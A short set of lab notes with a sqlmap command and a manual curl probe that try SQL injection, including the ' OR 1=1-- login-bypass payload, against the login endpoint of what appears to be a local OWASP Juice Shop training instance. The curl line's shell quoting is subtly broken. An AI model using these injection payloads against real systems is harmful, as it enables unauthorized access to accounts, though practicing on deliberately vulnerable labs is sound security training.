# Quick SQLMap check (adjust URL/params)
```
sqlmap -u "http://localhost:3000/rest/user/login" \
  --data='email=admin@juice-sh.op&password=test' \
  --method=POST --batch --risk=2 --level=2
```

# Manual curl probe (boolean-based)
```
curl -i -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"\' OR 1=1--","password":"x"}'
```
